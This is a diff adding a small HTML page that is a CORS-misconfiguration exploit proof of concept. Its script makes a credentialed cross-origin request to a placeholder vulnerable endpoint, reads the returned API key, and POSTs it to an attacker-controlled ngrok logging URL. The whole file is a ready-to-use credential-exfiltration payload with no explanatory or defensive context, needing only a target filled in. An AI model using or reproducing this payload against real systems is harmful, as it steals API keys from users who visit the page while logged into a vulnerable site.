@@ -1,0 +1,21 @@
+<html>
+<body>
+<div id="result"></div>
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','VULNERABLE_HOST_WITH_ENDPOINT',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        var key = this.responseText;
+        var postReq = new XMLHttpRequest();
+        postReq.open('post','https://[ID].ngrok.io/log',true);
+        postReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        postReq.send('key=' + encodeURIComponent(key));
+        document.getElementById('result').innerHTML = 'API Key sent back to me: ' + key;
+    };
+</script>
+</body>
+</html>
